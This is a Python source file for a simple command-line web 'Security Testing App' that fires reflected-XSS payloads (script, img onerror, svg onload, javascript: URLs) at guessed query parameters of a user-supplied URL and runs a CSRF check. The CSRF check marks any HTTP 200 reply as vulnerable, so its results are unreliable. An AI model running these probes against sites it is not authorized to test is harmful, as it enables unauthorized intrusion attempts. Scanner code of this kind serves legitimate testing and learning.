from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# List of available attacks
ATTACKS = {
    "xss": "run_xss_test",
    "csrf": "run_csrf_test"
}


# test

# --- Attack Handlers ---

# XSS Attack Tester
# Enhanced XSS Tester for Inputs Allowing HTML Tags
def run_xss_test(target_url):
    # Updated payloads to focus on text inputs allowing HTML tags
    XSS_PAYLOADS = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror="alert(\'XSS\')">',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<a href="javascript:alert(\'XSS\')">Click me</a>'
    ]
    PARAM_NAMES = ["input", "text", "content", "query"]

    results = []
    for param_name in PARAM_NAMES:
        for payload in XSS_PAYLOADS:
            try:
                # Send a request with each payload
                response = requests.get(target_url, params={param_name: payload})

                # Inspect response content for reflected payloads
                if payload in response.text:
                    # Check for execution-like patterns
                    results.append({
                        "parameter": param_name,
                        "payload": payload,
                        "vulnerable": True
                    })
            except requests.RequestException:
                pass

    return results


# CSRF Attack Tester
def run_csrf_test(target_url):
    CSRF_DATA_SETS = [
        {"test_field": "csrf_test1"},
        {"test_field": "csrf_test2"},
        {"test_field": "csrf_test3"}
    ]
    results = []
    for data in CSRF_DATA_SETS:
        try:
            response = requests.post(target_url, data=data)
            if response.status_code == 200:  
                results.append({
                    "data": data,
                    "vulnerable": True
                })
        except requests.RequestException:
            pass
    return results


def run_attack(attack_type, target_url):
    if attack_type not in ATTACKS:
        return {"error": f"Attack '{attack_type}' not supported."}

    if attack_type == "xss":
        results = run_xss_test(target_url)
    elif attack_type == "csrf":
        results = run_csrf_test(target_url)
    else:
        results = []

    return {
        "attack_type": attack_type,
        "url": target_url,
        "results": results,
        "success": bool(results)
    }

# --- CLI Interface ---
def main():
    print("Welcome to the Security Testing App!")
    print("Available attacks:")
    for attack in ATTACKS.keys():
        print(f"- {attack}")
    attack_type = input("Choose an attack: ").strip().lower()

    target_url = input("Enter the target URL (e.g., http://localhost:8000): ").strip()

    print(f"Running {attack_type.upper()} attack on {target_url}...")
    result = run_attack(attack_type, target_url)

    # Print summary
    print("\n--- Attack Summary ---")
    print(f"Attack Type: {result['attack_type']}")
    print(f"Target URL: {result['url']}")
    print(f"Success: {'Yes' if result['success'] else 'No'}")
    if result['results']:
        print("Details:")
        for detail in result['results']:
            print(detail)
    else:
        print("No vulnerabilities found.")
    print("\nTest complete!")

if __name__ == "__main__":
    main()
